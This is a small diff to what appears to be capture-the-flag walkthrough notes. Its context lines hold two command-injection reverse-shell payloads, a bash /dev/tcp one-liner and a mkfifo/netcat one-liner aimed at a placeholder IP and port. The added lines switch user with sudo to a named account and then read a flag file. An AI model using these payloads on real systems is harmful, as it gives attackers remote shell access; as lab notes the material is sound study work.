@@ -17,4 +17,5 @@
 9. create reverse shell
 	- ; bash -c "bash -i >& /dev/tcp/IP/PORT 0>&1" 
 	- ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc IP PORT >/tmp/f
-10. cat /etc/flag.enc
+10. become phillip --> (sudo -u phillip /bin/bash)
+11. cat /etc/flag.enc
